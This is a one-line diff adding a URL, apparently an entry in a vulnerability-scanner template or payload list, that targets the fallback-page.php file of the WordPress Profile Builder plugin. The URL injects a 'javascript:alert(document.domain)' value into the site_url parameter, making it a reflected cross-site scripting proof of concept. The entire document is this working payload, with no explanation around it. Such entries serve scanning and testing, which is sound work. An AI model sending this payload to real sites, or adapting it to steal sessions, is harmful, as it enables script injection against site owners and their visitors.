@@ -1,0 +1,1 @@
+/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain);&message=Not+Found&site_name=404
